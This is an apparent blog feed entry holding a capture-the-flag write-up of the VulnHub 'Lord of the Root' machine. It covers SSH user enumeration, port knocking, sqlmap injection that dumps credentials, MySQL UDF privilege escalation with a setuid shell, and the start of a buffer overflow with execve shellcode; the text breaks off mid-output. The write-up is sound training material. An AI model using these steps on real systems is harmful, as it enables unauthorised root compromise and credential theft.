<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: writeups | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/writeups/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2017-06-15T14:41:03-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Bow before the Lord of the Root]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/12/bow-before-the-lord-of-the-root/"/>
    <updated>2017-06-12T11:08:37-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/12/bow-before-the-lord-of-the-root</id>
    <content type="html"><![CDATA[<p>Back to looking through VulnHub&rsquo;s selection of virtual machines, I got hooked by the name of this one. The author intended for this machine to be similar in difficulty to those in the OSCP lab, so it&rsquo;s definitely good training if you&rsquo;re preparing to jump into the fray!</p>

<!-- more -->


<p>The port scan revealed only 1 open port:</p>

<p><code>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
</code></p>

<p>I also ran a UDP scan, but got nothing. I proceeded to google the SSH version, and got a hit quite fast. It appears that this OpenSSH version is vulnerable to <a href="https://www.ubuntu.com/usn/usn-3061-1/">CVE-2016-6210</a>, which allows users to be enumerated.</p>

<p>Luckily for us, there is an <a href="https://www.exploit-db.com/exploits/40136/">exploit</a> available.</p>

<p>```
python 40136.py -h
usage: 40136.py [-h] [-u USER | -U USERLIST] [-e] [-s] [&mdash;bytes BYTES]</p>

<pre><code>            [--samples SAMPLES] [--factor FACTOR] [--trials TRIALS]
            host
</code></pre>

<p>positional arguments:
  host                  Give SSH server address like ip:port or just by ip</p>

<p>optional arguments:
  -h, &mdash;help            show this help message and exit
  -u USER, &mdash;user USER  Give a single user name
  -U USERLIST, &mdash;userlist USERLIST</p>

<pre><code>                    Give a file containing a list of users
</code></pre>

<p>  -e, &mdash;enumerated      Only show enumerated users
  -s, &mdash;silent          Like -e, but just the user names will be written to</p>

<pre><code>                    stdout (no banner, no anything)
</code></pre>

<p>  &mdash;bytes BYTES         Send so many BYTES to the SSH daemon as a password
  &mdash;samples SAMPLES     Collect so many SAMPLES to calculate a timing baseline</p>

<pre><code>                    for authenticating non-existing users
</code></pre>

<p>  &mdash;factor FACTOR       Used to compute the upper timing boundary for user</p>

<pre><code>                    enumeration
</code></pre>

<p>  &mdash;trials TRIALS       try to authenticate user X for TRIALS times and</p>

<pre><code>                    compare the mean of auth timings against the timing
                    boundary
</code></pre>

<p>```</p>

<p>So you have to give the script a username or a list of users to enumerate. Well, we already know one user! If you glanced at the LordOfTheRoot VM after it booted, you probably noticed good old smeagol:</p>

<p><img class="center" src="/images/pentest/lordoftheroot/smeagol.png" title="&lsquo;smeagol&rsquo; &lsquo;smeagol&rsquo;" ></p>

<p>Ran the script with the smeagol username:</p>

<p>```
python 40136.py -u smeagol 192.168.217.136</p>

<p>User name enumeration against SSH daemons affected by CVE-2016-6210
Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari</p>

<p>[<em>] Testing SSHD at: 192.168.217.136:22, Banner: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.3
[</em>] Getting baseline timing for authenticating non-existing users&hellip;&hellip;&hellip;&hellip;
[<em>] Baseline mean for host 192.168.217.136 is 0.0507569 seconds.
[</em>] Baseline variation for host 192.168.217.136 is 0.0110011491622 seconds.
[<em>] Defining timing of x &lt; 0.0837603474867 as non-existing user.
[</em>] Testing your users&hellip;
[+] smeagol &ndash; timing: 0.425467
```</p>

<p>We know there is a smeagol user on the box, but couldn&rsquo;t find any other exploit that might help in this situation. So I just tried SSH'ing into the box to see what happens:</p>

<p>```
ssh <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#x73;&#109;&#x65;&#97;&#103;&#x6f;&#x6c;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#50;&#49;&#55;&#46;&#x31;&#51;&#54;">&#115;&#x6d;&#x65;&#x61;&#103;&#x6f;&#x6c;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#46;&#50;&#x31;&#55;&#x2e;&#49;&#51;&#54;</a>
The authenticity of host &lsquo;192.168.217.136 (192.168.217.136)&rsquo; can&rsquo;t be established.
ECDSA key fingerprint is SHA256:XzDLUMxo8ifHi4SciYJYj702X3PfFwaXyKOS07b6xd8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;192.168.217.136&rsquo; (ECDSA) to the list of known hosts.</p>

<pre><code>                                              .____    _____________________________
                                              |    |   \_____  \__    ___/\______   \
                                              |    |    /   |   \|    |    |       _/
                                              |    |___/    |    \    |    |    |   \
                                              |_______ \_______  /____|    |____|_  /
                                                      \/       \/                 \/
</code></pre>

<p> <em><em><strong>  </strong>.                     <strong>     </strong></em></em><strong><em><strong><strong>      .</strong>                   .</strong></em> </strong><strong><strong><strong><strong><em>      </em></strong></strong></strong></strong><strong>       </strong>
|    |/ <em>| </em><em><strong>   </strong><strong>   </strong></em><em> |  | <strong> _   </strong></em><strong>/</strong><em><em><strong>|</strong>| </em></em><strong>   </strong><strong>    </strong>| <em>/ _</em>    <strong><em>/</em></strong>   _   <strong><strong><em>/ </em></strong></strong>/  |<em>  </em><em><strong><strong><strong><strong><em>
|      &lt;  /    \ /  _ _/ </em></strong>\|  |/ /  |    </strong>) _  </strong> \  |/ </strong> \ /    \  / <strong> |    |    | /  _ \   |    </strong>)</em> /    \   <strong>\/ </strong> _  <strong> \
|    |  \|   |  (  &lt;_> )  _</strong>|    &lt;   |     \   |  | \/  \  <strong><em>/|   |  \/ /</em>/ |    |    |(  &lt;<em>> )  |        \   |  \  | \  </em></strong>/|  | \/
|<em><em><strong>|</strong> _<strong>|  /_</strong></em>/ _<strong>  ></strong>|</em> \  _<strong>  /   |</strong>|  |<strong>|_</strong>  ><strong><em>|  /_</em></strong> |    |<em><strong><em>| _</em></strong>/  /</em><strong><strong><em>_  /</em></strong>|  /</strong>|  _<strong>  ></strong>|</p>

<pre><code>    \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
</code></pre>

<p>Easy as 1,2,3
<a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#58;&#x73;&#109;&#x65;&#x61;&#103;&#x6f;&#108;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#54;&#56;&#x2e;&#x32;&#x31;&#55;&#x2e;&#49;&#51;&#x36;">&#x73;&#109;&#101;&#97;&#103;&#x6f;&#108;&#64;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#x32;&#x31;&#55;&#x2e;&#49;&#51;&#54;</a>&rsquo;s password:
```</p>

<p>Woot, a banner with a hint! The knock part might reference port knocking, as I&rsquo;ve seen that in some previous challenges. And the ports seem to be mentioned already! I used Nmap to knock on ports 1,2 and 3:</p>

<p>```
nmap -r -p1,2,3 192.168.217.136</p>

<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-06-12 12:31 EDT
Nmap scan report for 192.168.217.136
Host is up (0.00065s latency).
PORT  STATE    SERVICE
1/tcp filtered tcpmux
2/tcp filtered compressnet
3/tcp filtered compressnet
```</p>

<p>The <code>-r</code> option was necessary to scan the ports in consecutive order. After knocking, I ran the full Nmap scan again, and a web server now awaited me:</p>

<p><code>
1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
</code></p>

<p>I checked it out in the browser, and found this image:</p>

<p><img class="center" src="/images/pentest/lordoftheroot/willdo.jpeg" title="&lsquo;mordor&rsquo; &lsquo;take the ring to mordor&rsquo;" ></p>

<p>Ran exiftool and strings on the picture, didn&rsquo;t find anything. Next I went to the <em>/images</em> directory where the image was served from, and found 2 more. Downloaded them and put them through exiftool and strings, still no results. In the meantime, I had also fired up a directory bruteforce on the server, but that didn&rsquo;t get me anywhere either. So the next thing I tried was to see if there is a directory called smeagol on the web server. There wasn&rsquo;t, but I was presented this picture, one of the 3 images found:</p>

<p><img class="center" src="/images/pentest/lordoftheroot/hipster.jpg" title="&lsquo;hipster&rsquo; &lsquo;hipster&rsquo;" ></p>

<p>Further testing confirmed that this image acted as a 404 page. But when I looked at the source, I found a suspicious string in a comment:</p>

<p>```</p>

<!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh>
```

I put the string into a [multipurpose online decoder](https://encoder.mattiasgeniar.be/index.php) and got a base64 string out of it: <code>Lzk3ODM0NTIxMC9pbmRleC5waHA=</code>. Decoding it revealed a directory on the web server: <code>/978345210/index.php</code>. Going there, I found a login page!

<img class="center" src="/images/pentest/lordoftheroot/mordor.png" title="mordor" alt="mordor login">

Time for sqlmap! I had to play with it and tweak quite a bit, the default levels didn't report any injection vulnerability, and the scan took so long, I had to break the enumeration into manageable pieces:

``` 
sqlmap -u "http://192.168.217.136:1337/978345210/index.php" --method POST -o --level=5 --risk=3 --dbms=MySQL -p username --data="username=smeagol&password=precious&submit=+Login+" --current-db
```

First, I queried for the current DB in use. I also turned on all the optimizaton switches, raised testing levels, and started with the username parameter. And luckily, it was vulnerable:

``` 
current database:    'Webapp'
```

Next, I dumped the discovered database:

``` 
sqlmap -u "http://192.168.217.136:1337/978345210/index.php" --method POST -o --level=5 --risk=3 --dbms=MySQL -p username --data="username=smeagol&password=precious&submit=+Login+" -D Webapp --dump
[...]
Database: Webapp
Table: Users
[5 entries]
+----+----------+------------------+
| id | username | password         |
+----+----------+------------------+
| 1  | frodo    | iwilltakethering |
| 2  | smeagol  | MyPreciousR00t   |
| 3  | aragorn  | AndMySword       |
| 4  | legolas  | AndMyBow         |
| 5  | gimli    | AndMyAxe         |
+----+----------+------------------+
```

Now that I had usernames and passwords, it was time to test them on SSH! I started with smeagol, because it looked slightly different than the others :-) And I got in:

``` 
smeagol@LordOfTheRoot:~$ uname -a
Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
```

So, especially for older machines, one of the first things I do is check the kernel version. Googling it actually yielded a [privilege escalation exploit](https://www.exploit-db.com/exploits/39166/) right away. I decided to save this approach for last, because the exploit wasn't known at the time of the VM release. Instead, I proceeded to some more conventional enumeration.


I downloaded my [linux_privcheck](https://github.com/chousensha/linux_privcheck) tool with <code>wget https://raw.githubusercontent.com/chousensha/linux_privcheck/master/privinfo.py</code> and ran it on the machine while I ate a lasagna. Then I combed through the output (note to self: I have to revisit my script and make improvements to it, will get to it). The interesting tidbits that I observed were:

``` 
root      1174     1  0 08:15 ?        00:00:08 /usr/sbin/mysqld
```

MySQL running as root! Definitely on to something there, as we could get root credentials from SQLi. The other thing I found were some setuid binaries in a suspicious folder:

``` 
/SECRET/door2/file
/SECRET/door1/file
/SECRET/door3/file
```

The machine description on VulnHub stated that there are 2 methods for gaining privilege escalation..and here we are with 2 possible venues of attack! Let's take them in order!

## Privilege escalation method #1 - via MySQL

With MySQL running as root, we can use [a UDF and a setuid binary to gain a root shell](https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/). At the core of this exploit is the fact that a User Defined Function can be evaluated as SQL code to run commands in the context of the MySQL process, which is root in this case. As I was reading through the article, it became clear that root credentials would be needed for the database server. So I went back to sqlmap, and this time added the switches <code>--users</code> and <code>--passwords</code>:

``` 
database management system users [5]:
[*] 'debian-sys-maint'@'localhost'
[*] 'root'@'127.0.0.1'
[*] 'root'@'::1'
[*] 'root'@'localhost'
[*] 'root'@'lordoftheroot'

database management system users password hashes:
[*] debian-sys-maint [1]:
    password hash: *A55A9B9049F69BC2768C9284615361DFBD580B34
[*] root [1]:
    password hash: *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F
```

I used an online cracker for the root hash, and the cracked password was *darkshadow*. Then I connected to the MySQL database:

``` 
smeagol@LordOfTheRoot:~$ mysql -u root -p 
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1829
Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```


Next, I followed the steps of the [infamoussyn article](https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/), which are really well explained. UDF files need to be [locally compiled and installed on the server host](https://dev.mysql.com/doc/refman/5.7/en/udf-compiling.html), and a special directory is required for that..

- Find the location where MySQL looks for shared object files, identified by the <code>plugin_dir</code> variable:

``` 
mysql> show variables like "plugin_dir";
+---------------+------------------------+
| Variable_name | Value                  |
+---------------+------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/ |
+---------------+------------------------+
1 row in set (0.00 sec)
```

The required directory is found at <code>/usr/lib/mysql/plugin/</code>. This is where we'll put our UDF object files.

- Now it's time to compile the object file. The exploit that allows privilege escalation is called[raptor_udf2.c](https://www.exploit-db.com/exploits/1518/). I downloaded it to the compromised machine, and followed the instructions in the source code to compile it:

``` 
gcc -g -c raptor_udf2.c
```

If you are lost in the myriad of GCC options from its manpage, there is a cool page offering [options summary](https://gcc.gnu.org/onlinedocs/gcc/Option-Summary.html) in a way that lets you jump to whatever interests you. Here, I compiled the C file without linking, and with debugging information. This produced an object file called <code>raptor_udf2.o</code>. 

- Next, you create a shared library and link it:

``` 
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

If you copy from the source code, you have to change the 1 in *-W1* to a lowercase l, otherwise you get an error. Here's a [good resource](http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html) to help you untangle the above command. Now you should also have in your directory a shared object called <code>raptor_udf2.so</code>.

- Now you create a table inside MySQL and insert the shared object contents. Switch to the mysql DB:

``` 
mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

Create table:

``` 
mysql> create table foo(line blob);
Query OK, 0 rows affected (0.03 sec)
```

Load your .so file:

``` 
mysql> insert into foo values(load_file('/home/smeagol/raptor_udf2.so'));
Query OK, 1 row affected (0.01 sec)
```

- Copy the .so file to the plugin directory:

``` 
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.05 sec)
```

- Now you can create the UDF:

``` 
mysql> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
1 row in set (0.00 sec)
```

- Confirm that it works:

``` 
mysql> select do_system('id > /tmp/out; chown smeagol.smeagol /tmp/out');
+------------------------------------------------------------+
| do_system('id > /tmp/out; chown smeagol.smeagol /tmp/out') |
+------------------------------------------------------------+
|                                                          0 |
+------------------------------------------------------------+
1 row in set (0.01 sec)

mysql> \! cat /tmp/out
uid=0(root) gid=0(root) groups=0(root)
```

Note that you can use *\\!* to run commands from within the MySQL shell.

- Finally, we want to gain a real root shell. A setuid shell is ideal for this. I placed the following C code inside a file called shell.c:

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

I used MySQL to compile it:

``` 
mysql> select do_system("gcc -o /tmp/ring /home/smeagol/shell.c");
+-----------------------------------------------------+
| do_system("gcc -o /tmp/ring /home/smeagol/shell.c") |
+-----------------------------------------------------+
|                                                   0 |
+-----------------------------------------------------+
1 row in set (0.15 sec)
```

Now set the SUID bit:

``` 
mysql> select do_system("chmod u+s /tmp/ring");
+----------------------------------+
| do_system("chmod u+s /tmp/ring") |
+----------------------------------+
|                                0 |
+----------------------------------+
1 row in set (0.01 sec)
```

I looked inside /tmp for confirmation:

``` 
smeagol@LordOfTheRoot:~$ ls -l /tmp/
total 12
-rw-rw---- 1 smeagol smeagol   39 Jun 14 04:06 out
-rwsrwx--x 1 root    root    7410 Jun 14 04:16 ring
```

Lastly, I dropped to a shell with <code>\\! sh</code>, and ran the newly created binary:

``` 
$ /tmp/ring
root@LordOfTheRoot:~# cat /root/Flag.txt 
“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
– Gandalf
```

Inside root's directory I also found source code for the binaries that will supply the second method of exploitation. And a Python script that moves them around, just like in the Tr0ll 2 challenge..

## Privilege escalation method #2 - Binary exploitation

So, I previously looked at the source code of the binaries inside the SECRET folder, and I know one of them is vulnerable to buffer overflow. Need to find which one:

``` 
smeagol@LordOfTheRoot:/SECRET$ ls -la *
door1:
total 16
drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
-rwsr-xr-x 1 root root 7370 Sep 17  2015 file

door2:
total 16
drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
-rwsr-xr-x 1 root root 5150 Sep 22  2015 file

door3:
total 16
drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
-rwsr-xr-x 1 root root 7370 Sep 17  2015 file
```

Let's see each of them:

``` 
door1/file 
Syntax: door1/file <input string>
```

I went through them, and determined that the vulnerable binary is the one with size 5150.

``` 
./file $(python -c 'print "A" * 200')
Segmentation fault (core dumped)
```

I copied the binary to /tmp, so I could work on it without the interference of the moving script. Normally, it's GDB time, but I want to expand my tools coverage, and I noticed in other writeups the mention of PEDA, or [Python Exploit Development Assistance for GDB](https://github.com/longld/peda), which adds cool features and colorizes the display. So I figured I'd give it a try, and downloaded it to the target and installed it:

``` 
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

If you want to see what PEDA can do, run <code>peda help</code> to see all available commands:

``` 
gdb-peda$ peda help
PEDA - Python Exploit Development Assistance for GDB
For latest update, check peda project page: https://github.com/longld/peda/
List of "peda" subcommands, type the subcommand to invoke it:
aslr -- Show/set ASLR setting of GDB
asmsearch -- Search for ASM instructions in memory
assemble -- On the fly assemble and execute instructions using NASM
checksec -- Check for various security options of binary
cmpmem -- Compare content of a memory region with a file
context -- Display various information of current execution context
context_code -- Display nearby disassembly at $PC of current execution context
context_register -- Display register information of current execution context
context_stack -- Display stack of current execution context
crashdump -- Display crashdump info and save to file
deactive -- Bypass a function by ignoring its execution (eg sleep/alarm)
distance -- Calculate distance between two addresses
dumpargs -- Display arguments passed to a function when stopped at a call instruction
dumpmem -- Dump content of a memory region to raw binary file
dumprop -- Dump all ROP gadgets in specific memory range
eflags -- Display/set/clear/toggle value of eflags register
elfheader -- Get headers information from debugged ELF file
elfsymbol -- Get non-debugging symbol information from an ELF file
gennop -- Generate abitrary length NOP sled using given characters
getfile -- Get exec filename of current debugged process
getpid -- Get PID of current debugged process
goto -- Continue execution at an address
help -- Print the usage manual for PEDA commands
hexdump -- Display hex/ascii dump of data in memory
hexprint -- Display hexified of data in memory
jmpcall -- Search for JMP/CALL instructions in memory
loadmem -- Load contents of a raw binary file to memory
lookup -- Search for all addresses/references to addresses which belong to a memory range
nearpc -- Disassemble instructions nearby current PC or given address
nextcall -- Step until next 'call' instruction in specific memory range
nextjmp -- Step until next 'j*' instruction in specific memory range
nxtest -- Perform real NX test to see if it is enabled/supported by OS
patch -- Patch memory start at an address with string/hexstring/int
pattern -- Generate, search, or write a cyclic pattern to memory
pattern_arg -- Set argument list with cyclic pattern
pattern_create -- Generate a cyclic pattern
pattern_env -- Set environment variable with a cyclic pattern
pattern_offset -- Search for offset of a value in cyclic pattern
pattern_patch -- Write a cyclic pattern to memory
pattern_search -- Search a cyclic pattern in registers and memory
payload -- Generate various type of ROP payload using ret2plt
pdisass -- Format output of gdb disassemble command with colors
pltbreak -- Set breakpoint at PLT functions match name regex
procinfo -- Display various info from /proc/pid/
profile -- Simple profiling to count executed instructions in the program
pyhelp -- Wrapper for python built-in help
readelf -- Get headers information from an ELF file
refsearch -- Search for all references to a value in memory ranges
reload -- Reload PEDA sources, keep current options untouch
ropgadget -- Get common ROP gadgets of binary or library
ropsearch -- Search for ROP gadgets in memory
searchmem -- Search for a pattern in memory; support regex search
session -- Save/restore a working gdb session to file as a script
set -- Set various PEDA options and other settings
sgrep -- Search for full strings contain the given pattern
shellcode -- Generate or download common shellcodes.
show -- Show various PEDA options and other settings
skeleton -- Generate python exploit code template
skipi -- Skip execution of next count instructions
snapshot -- Save/restore process's snapshot to/from file
start -- Start debugged program and stop at most convenient entry
stepuntil -- Step until a desired instruction in specific memory range
strings -- Display printable strings in memory
substr -- Search for substrings of a given string/number in memory
telescope -- Display memory content at an address with smart dereferences
tracecall -- Trace function calls made by the program
traceinst -- Trace specific instructions executed by the program
unptrace -- Disable anti-ptrace detection
utils -- Miscelaneous utilities from utils module
vmmap -- Get virtual mapping address ranges of section(s) in debugged process
waitfor -- Try to attach to new forked process; mimic "attach -waitfor"
xinfo -- Display detail information of address/registers
xormem -- XOR a memory region with a key
xprint -- Extra support to GDB's print command
xrefs -- Search for all call/data access references to a function/variable
xuntil -- Continue execution until an address or function

Type "help" followed by subcommand for full documentation.
```

It's time to run the binary! With Peda, you can create patterns just like with the Metasploit utilities:

``` 
gdb-peda$ peda help pattern
Generate, search, or write a cyclic pattern to memory
Set "pattern" option for basic/extended pattern type
Usage:
    pattern create size [file]
    pattern offset value
    pattern search
    pattern patch address size
    pattern arg size1 [size2,offset2]
    pattern env size[,offset]
gdb-peda$ pattern create 200 test
Writing pattern of 200 chars to filename "test"
```

<img class="center" src="/images/pentest/lordoftheroot/peda.png" title="peda" alt="segfault in peda">

I wanted to show a screenshot instead of the code, so you can also see the colors that make the output much more readable. You can see that EIP has been overwritten with the value 0x57414174. I searched for it in the pattern:

``` 
gdb-peda$ pattern search 0x57414174
Registers contain pattern buffer:
EBP+0 found at offset: 167
EIP+0 found at offset: 171
Registers point to pattern buffer:
[ESP] -->


<p> offset 175 &ndash; size ~25
Pattern buffer found at:
0xbffff571 : offset    0 &ndash; size  200 ($sp + -0xaf [-44 dwords])
0xbffff7f8 : offset    0 &ndash; size  200 ($sp + 0x1d8 [118 dwords])
References to pattern buffer found at:
0xbffff550 : 0xbffff571 ($sp + -0xd0 [-52 dwords])
0xbffff560 : 0xbffff571 ($sp + -0xc0 [-48 dwords])
0xbffff564 : 0xbffff7f8 ($sp + -0xbc [-47 dwords])
0xbffff6b8 : 0xbffff7f8 ($sp + 0x98 [38 dwords])
```</p>

<p>The reported offset is 171. Verified it really quick:</p>

<p><code>
gdb-peda$ r $(python -c 'print "A" * 171 + "B" * 4 + "C" * 4')
[...]
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff640 ("CCCC")
EIP: 0x42424242 ('BBBB')
</code></p>

<p>Alright, now we need some shellcode. I decided to use Peda for all the exploitation phases, so I could showcase more of its functionality. First, I looked at the options:</p>

<p>```
gdb-peda$ peda help shellcode
Generate or download common shellcodes.
Usage:</p>

<pre><code>shellcode generate [arch/]platform type [port] [host]
shellcode search keyword (use % for any character wildcard)
shellcode display shellcodeId (shellcodeId as appears in search results)
shellcode zsc [generate customize shellcode]

For generate option:
    default port for bindport shellcode: 16706 (0x4142)
    default host/port for connect back shellcode: 127.127.127.127/16706
    supported arch: x86
</code></pre>

<p>```</p>

<p>Next I searched for some execve shellcode, and settled for the below:</p>

<p><code>
[841]   Linux/x86 - Tiny Execve sh Shellcode - 21 bytes
</code></p>

<p>Let&rsquo;s see what I got here:</p>

<p>```
gdb-peda$ shellcode display 841
Connecting to shell-storm.org&hellip;</p>

<p>/*</p>

<p> Tiny Execve sh Shellcode &ndash; C Language &ndash; Linux/x86
 Copyright &copy; 2013 Geyslan G. Bem, Hacking bits</p>

<p>   <a href="http://hackingbits.com">http://hackingbits.com</a>
   <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#103;&#101;&#x79;&#115;&#108;&#x61;&#x6e;&#64;&#x67;&#109;&#x61;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;">&#103;&#x65;&#x79;&#x73;&#x6c;&#x61;&#x6e;&#64;&#x67;&#109;&#x61;&#105;&#108;&#46;&#99;&#111;&#x6d;</a></p>

<p> This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.</p>

<p> This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.</p>

<p> You should have received a copy of the GNU General Public License
 along with this program.  If not, see <a href="http://www.gnu.org/licenses/">http://www.gnu.org/licenses/</a></p>

<p>*/</p>

<p>/*</p>

<p>   tiny_execve_sh_shellcode</p>

<ul>
<li>21 bytes</li>
<li>null-free</li>
</ul>


<p>   # gcc -m32 -fno-stack-protector -z execstack tiny_execve_sh_shellcode.c -o tiny_execve_sh_shellcode</p>

<p>   Testing
   # ./tiny_execve_sh_shellcode</p>

<p>*/</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>unsigned char shellcode[] = \</p>

<p>&ldquo;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f&rdquo;
&ldquo;\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd&rdquo;
&ldquo;\x80&rdquo;;</p>

<p>main ()
{</p>

<pre><code>    // When contains null bytes, printf will show a wrong shellcode length.

printf("Shellcode Length:  %d\n", strlen(shellcode));

// Pollutes all registers ensuring that the shellcode runs in any circumstance.

__asm__ ("movl $0xffffffff, %eax\n\t"
     "movl %eax, %ebx\n\t"
     "movl %eax, %ecx\n\t"
     "movl %eax, %edx\n\t"
     "movl %eax, %esi\n\t"
     "movl %eax, %edi\n\t"
     "movl %eax, %ebp\n\t"

     // Calling the shellcode
     "call shellcode");
</code></pre>

<p>}
```</p>

<p>Ok, the shellcode is <code>\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</code>. Next we need the address of ESP, so we know where to store our shellcode. Then we can have a full payload, where we point EIP to the contents of ESP, and the shellcode gets executed.</p>

<p>```
gdb-peda$ context stack</p>

<p>[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;stack&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
0000| 0xbffff640 (&ldquo;CCCC&rdquo;)
0004| 0xbffff644 &mdash;> 0xbffff600 (&lsquo;A&rsquo; <repeats 60 times>, &ldquo;BBBBCCCC&rdquo;)
0008| 0xbffff648 &mdash;> 0xbffff6e0 &mdash;> 0xbffff8c1 (&ldquo;XDG_SESSION_ID=1&rdquo;)
0012| 0xbffff64c &mdash;> 0xb7feccea (&lt;call_init+26>:    add    ebx,0x12316)
0016| 0xbffff650 &mdash;> 0x2
0020| 0xbffff654 &mdash;> 0xbffff6d4 &mdash;> 0xbffff803 (&ldquo;/tmp/file&rdquo;)
0024| 0xbffff658 &mdash;> 0xbffff674 &mdash;> 0x658f7063
0028| 0xbffff65c &mdash;> 0x804974c &mdash;> 0xb7e2f990 (&lt;__libc_start_main>: push   ebp)
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
```</p>

<p>So ESP is located at 0xbffff640. Or so I thought..when I ran my payload, I got another segfault and the address of ESP was different. I didn&rsquo;t expect something like ASLR to be enabled, but when I checked, it actually is:</p>

<p><code>
cat /proc/sys/kernel/randomize_va_space
2
</code></p>

<p>I checked with <em>ldd</em>:</p>

<p>```
smeagol@LordOfTheRoot:/tmp$ ldd file</p>

<pre><code>linux-gate.so.1 =&gt;  (0xb773d000)
